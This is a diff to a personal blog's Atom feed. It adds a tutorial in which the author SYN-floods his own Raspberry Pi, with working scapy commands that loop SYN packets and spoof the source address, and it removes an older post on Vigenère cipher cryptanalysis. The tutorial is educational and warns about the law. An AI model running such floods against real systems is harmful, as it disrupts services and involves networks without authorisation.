@@ -5,10 +5,153 @@
   <id>https://andystabler.co.uk</id>
   <link href="https://andystabler.co.uk"/>
   <link href="https://andystabler.co.uk/feed.xml" rel="self"/>
-  <updated>2022-01-03T00:00:00+00:00</updated>
+  <updated>2022-02-20T00:00:00+00:00</updated>
   <author>
     <name>Andy Stabler</name>
   </author>
+  <entry>
+    <title>SYN Flood Denial of Service Attack</title>
+    <link rel="alternate" href="/blog/syn-flood-denial-of-service-attack/"/>
+    <id>/blog/syn-flood-denial-of-service-attack/</id>
+    <published>2022-02-20T00:00:00+00:00</published>
+    <updated>2022-02-20T00:00:00+00:00</updated>
+    <author>
+      <name>Andy Stabler</name>
+    </author>
+    <summary type="html">&lt;p&gt;&lt;img src="/images/syn-flood-denial-of-service-attack/rob-curran-sUXXO3xPBYo-unsplash-a1b3e3b8.jpg" class="blog-post-image" alt=""&gt;&lt;/p&gt;
+
+&lt;p&gt;Last week I performed a Denial of Service attack against my Raspberry Pi. I used something called a SYN flood attack because it's a really simple and fun way to learn about TCP.&lt;/p&gt;
+
+&lt;p&gt;Before we go any further I need to just point out that you can get...&lt;/p&gt;</summary>
+    <content type="html">&lt;p&gt;&lt;img src="/images/syn-flood-denial-of-service-attack/rob-curran-sUXXO3xPBYo-unsplash-a1b3e3b8.jpg" class="blog-post-image" alt="" /&gt;&lt;/p&gt;
+
+&lt;p&gt;Last week I performed a Denial of Service attack against my Raspberry Pi. I used something called a SYN flood attack because it's a really simple and fun way to learn about TCP.&lt;/p&gt;
+
+&lt;p&gt;Before we go any further I need to just point out that you can get into serious trouble if you execute an attack on a computer you're not authorised to mess with. Here's what the NCA has to say:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;a href="https://www.nationalcrimeagency.gov.uk/?view=article&amp;amp;id=243"&gt;&lt;em&gt;The Computer Misuse Act 1990 makes it illegal to intentionally impair the operation of a computer or prevent or hinder access to a program/data on a computer unless you are authorised to do so.&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The laws could be different in your country so please do your research and behave responsibly :)&lt;/p&gt;
+
+&lt;h2 id="whats-a-syn-flood-attack"&gt;What's a SYN Flood attack?&lt;/h2&gt;
+
+&lt;p&gt;When a server (website) and a client (your browser) want to talk to each other they need to first establish a connection. This is done by something called the TCP 3-way handshake. The handshake is essentially:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Client says to server "Hey, wanna chat?" (the SYN flag is set in the TCP header)&lt;/li&gt;
+  &lt;li&gt;Server responds with "Yeah" (both the SYN and ACK flag would be set in the response)&lt;/li&gt;
+  &lt;li&gt;Client responds with "Cool" (just the ACK flag would be set)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Here's a picture from Wikipedia that shows the handshake:&lt;/p&gt;
+
+&lt;p&gt;[1]&lt;img src="/images/syn-flood-denial-of-service-attack/Tcp_normal.svg-4f2dae97.png" class="blog-post-image" alt="" /&gt;&lt;/p&gt;
+
+&lt;p&gt;When the server receives a SYN request it uses some resources to remember that the request came in. This way when it receives the final ACK request it can match it up to the first SYN request and the connection can be established successfully.&lt;/p&gt;
+
+&lt;p&gt;We can exploit the 3-way handshake by firing lots of SYN requests without any intention of finishing the handshake (we never send the final ACK request). The server will use more and more resources to store these incomplete handshakes and eventually be unable to respond to any legitimate requests.&lt;/p&gt;
+
+&lt;h2 id="the-attack"&gt;The Attack&lt;/h2&gt;
+
+&lt;p&gt;The plan is to start a server on my Raspberry Pi and then trigger a SYN flood attack from another machine. I'm going to use a Raspberry Pi as my victim because it helps me visualise the client and server, but a virtual machine would work just as well!&lt;/p&gt;
+
+&lt;h3 id="step-1---starting-the-web-server-on-the-raspberry-pi"&gt;Step 1 - Starting the web server on the Raspberry Pi&lt;/h3&gt;
+
+&lt;p&gt;I'm too lazy to connect the Raspberry Pi up to a keyboard/monitor so I'm going to control it from my macbook. The following nmap command scans the machines on the local network and tells us their IP address:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class="bash"&gt; $ nmap --script smb-os-discovery -p 445 192.168.1.0&amp;#x2F;24
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src="/images/syn-flood-denial-of-service-attack/nmap-results-f62551ce.png" class="blog-post-image" alt="" /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we know the IP address is 192.168.1.227, let's SSH into the Raspbery Pi and start the server.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class="bash"&gt;  $ ssh pi@192.168.1.227
+  pi@raspberrypi:~ $ cd ~&amp;#x2F;dev&amp;#x2F;my_site
+  pi@raspberrypi:~ $ echo &amp;quot;&amp;lt;h1&amp;gt;Hello, World&amp;lt;&amp;#x2F;h1&amp;gt;&amp;quot; &amp;gt; index.html
+  pi@raspberrypi:~ $ ruby -run -ehttpd . -p8000
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We have a server running on port 8000 of the Raspberry Pi!&lt;/p&gt;
+
+&lt;h3 id="step-2---start-inspecting-traffic-on-the-raspberry-pi"&gt;Step 2 - Start inspecting traffic on the Raspberry Pi&lt;/h3&gt;
+
+&lt;p&gt;Using wireshark we can inspect the packets that the Raspberry Pi is sending and receiving. I'm going to use tshark so I can run it from a terminal, but you might get more out of using the GUI version. The following command will display all traffic that's coming and going on port 8000 (the port our site is using).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class="bash"&gt;  pi@raspberrypi:~ $ tshark -Y &amp;quot;tcp.port == 8000&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now when we visit 192.168.1.227:8000 we can actually see the handshake taking place in tshark's output:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="/images/syn-flood-denial-of-service-attack/tshark-handshake-a0bda610.png" class="blog-post-image" alt="" /&gt;&lt;/p&gt;
+
+&lt;p&gt;Keep tshark running while we perform the attack in step 3!&lt;/p&gt;
+
+&lt;h3 id="step-3---perform-the-attack"&gt;Step 3 - Perform the attack&lt;/h3&gt;
+
+&lt;p&gt;I'm using a tool called scapy, but there are various options available (hping3 is a common choice). We just need the ability to construct and manipulate TCP packets.&lt;/p&gt;
+
+&lt;p&gt;I like how scapy can be used to construct packets, the syntax involves using a &lt;code&gt;/&lt;/code&gt; to stack layers, like so &lt;code&gt;packet = ip/tcp/data&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;On the attacking machine (not the Raspberry Pi), the following commands can be used to start the attack:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class="bash"&gt;  $ scapy
+  &amp;gt;ip = IP(dst=&amp;quot;192.168.1.227&amp;quot;) # pass in the Raspberry Pi&amp;#x27;s IP address as the destination
+  &amp;gt;tcp = TCP(dport=8000, flags=&amp;quot;S&amp;quot;) # set the destination port to 8000 and use the &amp;quot;S&amp;quot; flag to say we&amp;#x27;re just interested in SYN requests
+  &amp;gt;data = Raw(&amp;quot;Hello&amp;quot;)
+  &amp;gt;packet = ip&amp;#x2F;tcp&amp;#x2F;data # stack the layers together to get the packet
+  &amp;gt;send(packet, loop=1, verbose=0) # send the syn requests in an infinite loop
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id="step-4---inspecting-the-attack"&gt;Step 4 - Inspecting the attack&lt;/h3&gt;
+
+&lt;p&gt;After about a second, hit Ctrl-C to cancel the attack. At this point, if we take a look at the output from tshark we &lt;em&gt;should&lt;/em&gt; see a whole load of SYN requests.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="/images/syn-flood-denial-of-service-attack/tshark-unsuccessful-syn-flood-1dd8217b.png" class="blog-post-image" alt="" /&gt;&lt;/p&gt;
+
+&lt;p&gt;The output tells us that our attack isn't very effective. When the Raspberry Pi sends us a SYN/ACK response, our machine is responding with an RST. This means our machine is telling the server to forget about the connection and so our attack is doing no damage at all.&lt;/p&gt;
+
+&lt;h3 id="step-5---spoofing-the-source"&gt;Step 5 - Spoofing the source&lt;/h3&gt;
+
+&lt;p&gt;Our last attack wasn't so effective because our machine was resetting the connection and the server also detected that the requests were from the same port and labelled them as "TCP Retransmission".&lt;/p&gt;
+
+&lt;p&gt;We don't want the attacker to know who we are and so by spoofing the source IP address we get some anonymity. Spoofing the IP also means that we'll no longer get the response. This is fine because we're just interested in sending the SYN requests, we don't care about the response.&lt;/p&gt;
+
+&lt;p&gt;You have to be careful here though. It's not a good idea to spoof an IP address you don't own. By doing that you would be involving other networks and machines in your attack.&lt;/p&gt;
+
+&lt;p&gt;It's also worth noting that using any active IP address would result in the RST being sent back to the server, rendering the attack useless. It's best to use an IP address that isn't used and preferably one of the &lt;a href="https://datatracker.ietf.org/doc/html/rfc1918"&gt;RFC1918&lt;/a&gt; private addresses.&lt;/p&gt;
+
+&lt;p&gt;Let's try the attack again with a spoofed IP address and port:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class="bash"&gt;  $ scapy
+  &amp;gt;ip = IP(src=&amp;quot;10.0.0.1&amp;quot;, dst=&amp;quot;192.168.1.227&amp;quot;) # pass in a spoofed, unused, private IP address as the source IP
+  &amp;gt;tcp = TCP(sport=RandShort(), dport=8000, flags=&amp;quot;S&amp;quot;) # set the source port to a random value
+  &amp;gt;data = Raw(&amp;quot;Hello&amp;quot;)
+  &amp;gt;packet = ip&amp;#x2F;tcp&amp;#x2F;data # stack the layers together to get the packet
+  &amp;gt;send(packet, loop=1, verbose=0) # send the syn requests in an infinite loop
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let that run for about a second and hit Ctrl-C. The results in tshark should reveal a more effective attack:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="/images/syn-flood-denial-of-service-attack/tshark-syn-flood-1065331d.png" class="blog-post-image" alt="" /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lots of SYN requests are being sent from our spoofed 10.0.0.1 IP address and lots of SYN/ACK responses are being sent back. I can't see any RSTs in the output, which is also great. Scrolling all the way to the bottom of the output though, shows something even more interesting:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src="/images/syn-flood-denial-of-service-attack/tshark-retransmissions-ded1dd03.png" class="blog-post-image" alt="" /&gt;&lt;/p&gt;
+
+&lt;p&gt;Our Raspberry Pi didn't get any ACK responses when it sent the SYN/ACK to 10.0.0.1 and so it's sending the SYN/ACK again. This means it's not only taking up resources for fresh SYN requests, but it's also taking up resources by repeatedly sending the SYN/ACK because it assumed the packet was dropped.&lt;/p&gt;
+
+&lt;h2 id="final-notes"&gt;Final Notes&lt;/h2&gt;
+
+&lt;p&gt;The SYN flood attack isn't as effective as it used to be in the 80s/90s. Modern Linux doesn't allocate full resources to partially complete handshakes, but even so, if you had a botnet with several hundred machines performing a SYN flood attack I think it could cause some damage.&lt;/p&gt;
+
+&lt;p&gt;There are various ways to mitigate a SYN flood attack. Some to look at are &lt;a href="https://en.wikipedia.org/wiki/SYN_cookies"&gt;SYN cookies&lt;/a&gt; and blocking the source ip address (10.0.0.1 in our case).&lt;/p&gt;
+
+&lt;p&gt;Cheers!&lt;/p&gt;
+
+&lt;h2 id="references"&gt;References&lt;/h2&gt;
+
+&lt;p&gt;[1] &lt;a href="https://en.wikipedia.org/wiki/SYN_flood"&gt;https://en.wikipedia.org/wiki/SYN_flood&lt;/a&gt;&lt;/p&gt;
+</content>
+  </entry>
   <entry>
     <title>10 Years In Tech</title>
     <link rel="alternate" href="/blog/ten-years-in-tech/"/>
@@ -2310,295 +2453,6 @@ def get(path, options = {})
 end
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Morning well spent? ✅&lt;/p&gt;
-</content>
-  </entry>
-  <entry>
-    <title>Cryptanalysis - Vigenère Cipher</title>
-    <link rel="alternate" href="/blog/cryptanalysis-vigenere-cipher/"/>
-    <id>/blog/cryptanalysis-vigenere-cipher/</id>
-    <published>2015-05-04T01:00:00+01:00</published>
-    <updated>2015-05-04T01:00:00+01:00</updated>
-    <author>
-      <name>Andy Stabler</name>
-    </author>
-    <summary type="html">&lt;p&gt;In this post I cover the Vigenère cipher. It's an encryption system that builds on the Caesar cipher covered in the &lt;a href="/blog/cryptanalysis-caesar-cipher"&gt;previous post&lt;/a&gt;, with the additional twist that it uses multiple shift values instead of one. &lt;/p&gt;
-
-&lt;p&gt;Caesar's cipher shifts every character...&lt;/p&gt;</summary>
-    <content type="html">&lt;p&gt;In this post I cover the Vigenère cipher. It's an encryption system that builds on the Caesar cipher covered in the &lt;a href="/blog/cryptanalysis-caesar-cipher"&gt;previous post&lt;/a&gt;, with the additional twist that it uses multiple shift values instead of one. &lt;/p&gt;
-
-&lt;p&gt;Caesar's cipher shifts every character in the plaintext by a single shift value, resulting in ciphertext with a non-uniform distribution of characters. This means we can look at the frequencies of characters in the ciphertext and easily work out the shift value. The Vigenère cipher, however, uses several different shift values, which means the ciphertext has a much more uniform distribution of characters, making it harder to decrypt using the same frequency analysis method.&lt;p&gt;
-
-&lt;h2 id="encryption"&gt;Encryption&lt;/h2&gt;
-&lt;p&gt;A series of characters are used as the key (instead of just 1 value in \(\{0…|alphabet|-1\}\) for Caesar's cipher). Each character in the key represents a shift value.&lt;/p&gt;
-&lt;pre&gt;
-Plaintext: THETRUTHISRARELYPUREANDNEVERSIMPLE
-Key:       WILDE
-&lt;/pre&gt;
-&lt;p&gt;The key is then repeated so its length matches that of the plaintext.&lt;/p&gt;
-&lt;pre&gt;
-plaintext: THETRUTHISRARELYPUREANDNEVERSIMPLE
-key:       WILDEWILDEWILDEWILDEWILDEWILDEWILD
-&lt;/pre&gt;
-&lt;p&gt;For every character in the key, its index in the alphabet is used as the shift value for the corresponding plaintext character. This means we have &lt;em&gt;n&lt;/em&gt; Caesar ciphers at work, where &lt;em&gt;n&lt;/em&gt; is the number of characters in the key.
-&lt;/p&gt;
-&lt;p class="maths"&gt;\(C_{i} = (M_{i} + K_{i})\quad mod\quad26\)&lt;/p&gt;
-&lt;pre&gt;
-|A |B |C |D |E |F |G |H |I |J |K |L |M |N |O |P |Q |R |S |T |U |V |W |X |Y |Z |
-|0 |1 |2 |3 |4 |5 |6 |7 |8 |9 |10|11|12|13|14|15|16|17|18|19|20|21|22|23|24|25|
-
-Plaintext indices:
-T = 19
-H = 7
-E = 5
-T = 19
-R = 17
-U = 20
-T = 19
-H = 7
-…
-
-Key indices:
-W = 22
-I = 8
-L = 11
-D = 3
-E = 4
-
-T = (19 + 22) mod 26 = 15 = P
-H = (7 + 8)   mod 26 = 15 = P
-E = (4 + 11)  mod 26 = 15 = P
-T = (19 + 3)  mod 26 = 22 = W
-R = (17 + 4)  mod 26 = 21 = V
-U = (20 + 22) mod 26 = 16 = Q
-T = (19 + 8)  mod 26 =  1 = B
-H = (7 + 11)  mod 26 = 18 = S
-…
-
-Ciphertext: PPPWVQBSLWNICHPUXFUIWVOQIRMCVMIXWH
-&lt;/pre&gt;
-
-&lt;p&gt;Here's the Java code to encrypt:&lt;/p&gt;
-&lt;pre&gt;&lt;code class="java"&gt;public static String encrypt(String plaintext, String key) {
-    // key must be an alphabetic string
-    if (!key.matches(&amp;quot;[a-zA-Z]+&amp;quot;))
-        throw new IllegalArgumentException(&amp;quot;Invalid key - must be one or more characters in range a...z&amp;quot;);
-
-    // only interested in the alphabet
-    plaintext = plaintext.replaceAll(&amp;quot;[^a-zA-Z]&amp;quot;, &amp;quot;&amp;quot;).toUpperCase();
-
-    // make key same length as plaintext
-    key = StringUtils.repeatString(key, plaintext.length()).toUpperCase();
-
-    StringBuilder ciphertext = new StringBuilder();
-    for (int i = 0; i &amp;lt; plaintext.length(); i++) {
-        // get the character at index i
-        String toEncrypt = String.valueOf(plaintext.charAt(i));
-        // the shift is equal to the char at index i of the key
-        // subtracting A (65) to have a value in range 0-25
-        int shift = key.charAt(i) - 'A';
-        ciphertext.append(CaesarCipher.encrypt(toEncrypt, shift));
-    }
-    return ciphertext.toString();
-}&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id="decryption"&gt;Decryption&lt;/h2&gt;
-&lt;p&gt;Just like encryption, we repeat the key until it's the length of the ciphertext:&lt;/p&gt;
-&lt;pre&gt;
-ciphertext: PPPWVQBSLWNICHPUXFUIWVOQIRMCVMIXWH
-key:        WILDEWILDEWILDEWILDEWILDEWILDEWILD
-&lt;/pre&gt;
-&lt;p&gt;We can then call the Caesar cipher's decrypt function for every ciphertext character and corresponding key character. This will shift each character in the ciphertext backwards by the value of the key character.&lt;/p&gt;
-&lt;p class="maths"&gt;\(M_{i} = (C_{i} - K_{i})\quad mod\quad26\)&lt;/p&gt;
-&lt;pre&gt;
-Ciphertext indices:
-P = 15
-P = 15
-P = 15
-W = 22
-V = 21
-Q = 16
-B = 1
-S = 18
-L = 11
-…
-
-Key indices:
-W = 22
-I = 8
-L = 11
-D = 3
-E = 4
-
-P = (15 - 22) mod 26 = 19 = T
-P = (15 - 8)  mod 26 =  7 = H
-P = (15 - 11) mod 26 =  4 = E
-W = (22 - 3)  mod 26 = 19 = T
-V = (21 - 4)  mod 26 = 17 = R
-Q = (16 - 22) mod 26 = 20 = U
-B = (1  - 8)  mod 26 = 19 = T
-S = (18 - 11) mod 26 =  7 = H
-…
-
-Plaintext: THETRUTHISRARELYPUREANDNEVERSIMPLE
-&lt;/pre&gt;
-&lt;p&gt;Here's the Java code to decrypt:&lt;/p&gt;
-&lt;pre&gt;&lt;code class="java"&gt;public static String decrypt(String ciphertext, String key) {
-    // key must be an alphabetic string
-    if (key == null || !key.matches(&amp;quot;[a-zA-Z]+&amp;quot;))
-        throw new IllegalArgumentException(&amp;quot;Invalid key - must be one or more characters in range a...z&amp;quot;);
-
-    // only interested in the alphabet
-    ciphertext = ciphertext.replaceAll(&amp;quot;[^a-zA-Z]&amp;quot;, &amp;quot;&amp;quot;).toUpperCase();
-
-    // make key same length as plaintext
-    key = StringUtils.repeatString(key, ciphertext.length()).toUpperCase();
-
-    StringBuilder plaintext = new StringBuilder();
-    for (int i = 0; i &amp;lt; ciphertext.length(); i++) {
-        // get the character at index i
-        String toDecrypt = String.valueOf(ciphertext.charAt(i));
-        // the shift is equal to the char at index i of the key
-        // subtracting 'A' (65) to have a value in range 0-25
-        int shift = key.charAt(i) - 'A';
-        plaintext.append(CaesarCipher.decrypt(toDecrypt, shift));
-    }
-    return plaintext.toString();
-}&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id="cryptanalysis"&gt;Cryptanalysis&lt;/h2&gt;
-&lt;p&gt;When we don't have the key, deciphering text encrypted using the Vigenère cipher is slightly more involved than the methods we used for the Caesar cipher. Firstly, instead of just one shift value, there are many. In fact, there are potentially as many shift values as the length of the message (e.g. plaintext: "hello", key: "world"). This means that two characters with the same value in the plaintext can be encrypted to characters with different values in the ciphertext, which gives a much more uniform distribution of characters. It also means the frequency analysis approach we used for the Caesar cipher won't work here.&lt;/p&gt;
-
-&lt;h3 id="brute-force"&gt;Brute Force&lt;/h3&gt;
-&lt;p&gt;Using a brute force attack on the Caesar cipher wasn't that terrible really. The maximum number of shifts to try before finding the plaintext was the length of the alphabet – 1 (\(|A|-1\)), which in the case of the English alphabet is just 25. However, with the Vigenère cipher we don't know how long the key is. This means we need to try keys from length 1 to the length of the ciphertext. For every key length, we need to create keys of every combination of characters and then try decrypting the text with it.&lt;/p&gt;
-&lt;p&gt;An algorithm for a brute force attack might look something like:&lt;/p&gt;
-&lt;pre&gt;
-FOR keyLen = 1 to cipherLen STEP 1 DO
-    FOR combIndex = 0 to (|alphabet|^keyLen)-1 STEP 1 DO
-        key = getPermutation(alphabet, keyLen, combIndex);
-        PRINT VigenèreCipher.decrypt(ciphertext, key);
-    OD
-OD
-&lt;/pre&gt;
-&lt;p&gt;Which is clearly awful. You'd be looping 26&lt;sup&gt;n&lt;/sup&gt;, for n = 1 to the length of the ciphertext. If the ciphertext was of length 5, this would mean 26&lt;sup&gt;1&lt;/sup&gt; + 26&lt;sup&gt;2&lt;/sup&gt; + 26&lt;sup&gt;3&lt;/sup&gt; + 26&lt;sup&gt;4&lt;/sup&gt; + 26&lt;sup&gt;5&lt;/sup&gt; iterations. There must be a quicker way…&lt;/p&gt;
-
-&lt;h3 id="index-of-coincidence"&gt;Index of Coincidence&lt;/h3&gt;
-&lt;p&gt;The Ic (index of coincidence) of some string \(s\) or \(I_{c}(s)\) is the probability that any two randomly chosen characters in \(s\) are identical. Here's the formula (&lt;a href="http://practicalcryptography.com/cryptanalysis/text-characterisation/index-coincidence/"&gt;practicalcryptography.com&lt;/a&gt; have more to say on it):&lt;/p&gt;
-
-&lt;p class="maths"&gt;\(\sum_{i = A}^{i = Z}\frac{(F_{i})(F_{i}-1)}{N(N-1)}\)&lt;/p&gt;
-&lt;p&gt;Where \(F_{i}\) is the total number of times the \(i\)th character occurred in the ciphertext, and \(N\) is the length of the ciphertext.&lt;/p&gt;
-
-&lt;p&gt;As discussed in the &lt;a href="/blog/cryptanalysis-caesar-cipher"&gt;previous post&lt;/a&gt;, we know that text in the English language has a non-uniform distribution of characters, i.e. the letter E occurs about 12.7% of the time, followed by T (9.1%), then A (8.2%), etc. Knowing this we were able to decrypt text encrypted using the Caesar cipher because those frequencies didn't change when the plaintext was encrypted, only the characters occurring at those frequencies did. We shifted the alphabet until the frequencies of characters matched the expected frequencies for characters in the English language.&lt;/p&gt;
-&lt;p&gt;It turns out that English text usually has an Ic value of around 0.067. If we had calculated the Ic for text encrypted using the Caesar cipher, the value would have been exactly the same for the plaintext. This is because the formula only takes into account frequencies of characters, it doesn't know/care what character occurs at a given frequency. This is useful to know when trying to calculate the key length, because we are looking for a value such that each Caesar cipher in the key produces text with an Ic "close" to the English language Ic.&lt;/p&gt;
-
-&lt;h3 id="calculating-key-length"&gt;Index of Coincidence- calculating the key length&lt;/h3&gt;
-
-&lt;p&gt;Let us loop through every possible key length (1 .. length of cipher text), and calculate the Ic for strings made of up of characters encrypted using the same key character. The key length that produces an average Ic close to the expected Ic for English text (0.067) is our best guess at the key length.&lt;/p&gt;
-
-&lt;pre&gt;
-
-CIPHERTEXT:
-
-HAKQUMKNMJENPCACRMGDUCCDYAMGRLQFMJENPFTUHBQN
-TDLXGNWQFMJEPGSMGRGUPBTAECRFQFMJEZCLTZYEKELC
-SFCLEWNKGGTTDXFYXNLHYSNPOKDIMKNZVHBUAMCDBUTT
-PCXQFKQUZJLRPIGGTRVWHOIENIHPMBNELKSTPUMVEKNY
-BPSBINBHIVCNMNIMVLXDLNGGKGEGRLTPEMYHHUETREWG
-SVGNWGDEKFXHOKOSTTELQAFCZBPGEAPKKMBVIOGTACTM
-JERUTBNLMJIGMDBIIMCLPCTVJELCRXCPKGTMANXCTBFET
-
-Key length 2:
-ciphertext: H|A|K|Q|U|M|K|N|M|J|E|N|P|C|A|C|R|M|G|D|U|C|C|D|Y|A|M|...
-key pos:    1|2|1|2|1|2|1|2|1|2|1|2|1|2|1|2|1|2|1|2|1|2|1|2|1|2|1|...
-
-encrypted with 1st character of key:
-  HKUKMEPARGUCYM...
-  Index of coincidence: 0.0423963133640553
-
-encrypted with 2nd character of key:
-  AQMNJNCCMDCDA...
-  Index of coincidence: 0.0432051608522197
-
-Average index of coincidence: 0.04280073710813749
-Close to English: FALSE
-
-
-Key length 3:
-ciphertext: H|A|K|Q|U|M|K|N|M|J|E|N|P|C|A|C|R|M|G|D|U|C|C|D|Y|A|M|...
-key pos:    1|2|3|1|2|3|1|2|3|1|2|3|1|2|3|1|2|3|1|2|3|1|2|3|1|2|3|...
-
-encrypted with 1st character of key:
-  HQKJPCGCY...
-  Index of coincidence: 0.07024557395773844
-
-encrypted with 2nd character of key:
-  AUNECRDCA...
-  Index of coincidence: 0.06396344945745289
-
-encrypted with 3rd character of key:
-  KMMNAMUDM...
-  Index of coincidence: 0.07614696363982486
-
-Average index of coincidence: 0.07011866235167206
-Close to English: TRUE
-
-Best guess at key length = 3
-&lt;/pre&gt;
-
-&lt;p&gt;There we have it, we determined the key length to be 3. In reality, this approach might not be the most effective. For example, we stopped when we reached an Ic value "close" to the Ic for English text, but it could be the case that there are other key lengths that we didn't check that produce closer values.&lt;/p&gt;
-
-&lt;h3 id="key-from-length"&gt;Calculating the key from its length&lt;/h3&gt;
-&lt;p&gt;Now that we know the key length, we need to solve each caesar cipher in the key. For example, if our Vigenère cipher had a key length of 4, we would have 4 Caesar ciphers solve.&lt;/p&gt;
-&lt;p&gt;For every Caesar cipher we need to extract each character from the ciphertext that was encrypted using it, like so:&lt;/p&gt;
-&lt;pre&gt;
-Key length 3:
-ciphertext: H|A|K|Q|U|M|K|N|M|J|E|N|P|C|A|C|R|M|G|D|U|C|C|D|Y|A|M|...
-key pos:    1|2|3|1|2|3|1|2|3|1|2|3|1|2|3|1|2|3|1|2|3|1|2|3|1|2|3|...
-
-encrypted with 1st Caesar cipher:
-  HQKJPCGCY...
-
-encrypted with 2nd Caesar cipher:
-  AUNECRDCA...
-
-encrypted with 3rd Caesar cipher:
-  KMMNAMUDM...
-&lt;/pre&gt;
-&lt;p&gt;We can then apply the Caesar cipher frequency analysis attack on each Caesar cipher's encrypted text. This should give us the most likely shift value used for the corresponding Caesar cipher.&lt;/p&gt;
-&lt;p&gt;Once we know the shift value of each Caesar cipher, we will also know the key used in the encryption of the Vigenère cipher:&lt;/p&gt;
-
-&lt;pre&gt;
-CaesarCipher.calculateShift("HQKJPCGCY..."); // returns 2
-CaesarCipher.calculateShift("AUNECRDCA..."); // returns 0
-CaesarCipher.calculateShift("KMMNAMUDM..."); // returns 19
-
-Note: 'A' is the starting ASCII value of uppercase characters, so 5 + 'A' = 5 + 65 = 70 = ASCII character F
-
-key   = 2, 0, 19
-  = 2 + 'A',  0 + 'A', 19 + 'A'
-  = 2 + 65, 0 + 65, 19 + 65
-  = 67, 65, 84
-  = C, A, T
-  = CAT
-&lt;/pre&gt;
-&lt;p&gt;All that's left to do now is to pop the key into the Vigenère decryption function to see if it successfully decrypts the ciphertext:&lt;/p&gt;
-&lt;pre&gt;
-VigenereCipher.decrypt("HAKQUMKNMJENPCACRMGDUCCDYAMGRLQFMJENPFTUHBQN...", "CAT");
-returns:
-FAROUTINTHEUNCHARTEDBACKWATERSOFTHEUNFASHION
-ABLEENDOFTHEWESTERNSPIRALARMOFTHEGALAXYLIESA
-SMALLUNREGARDEDYELLOWSUNORBITINGTHISATADISTA
-NCEOFROUGHLYNINETYTWOMILLIONMILESISANUTTERLY
-INSIGNIFICANTLITTLEBLUEGREENPLANETWHOSEAPEDE
-SCENDEDLIFEFORMSARESOAMAZINGLYPRIMITIVETHATT
-HEYSTILLTHINKDIGITALWATCHESAREAPRETTYNEATIDEA
-
-Sweet, an excerpt from The Hitchhiker's Guide to the Galaxy!
-&lt;/pre&gt;
-
-&lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
-&lt;p&gt;At first glance the Vigenère cipher appears to be a much harder cipher to crack than the Caesar cipher; it has a more uniform distribution of characters, so a basic frequency analysis won't do. However, since this cipher is made up of multiple Caesar ciphers, once we know the key length we can simply call our Caesar cipher attack code on each Caesar cipher to determine the key.&lt;/p&gt;
-&lt;p&gt;The index of coincidence attack becomes much more effective when the ciphertext is a large string because we can then get an accurate indication of whether each Caesar cipher's ciphertext has an Ic close to the Ic for English text. When the ciphertext is a short string we cannot accurately determine this, and therefore we cannot automatically determine the Vigenère cipher key. In this case it would be a good idea to alter the algorithm to return the 3-5 most likely key lengths.&lt;/p&gt;
-&lt;p&gt;I've implemented the Vigenère cipher encryption/decryption and attacks in Java- you can grab the code &lt;a href="https://github.com/AndyStabler/Crypto"&gt;here&lt;/a&gt;.&lt;/p&gt;
 </content>
   </entry>
 </feed>
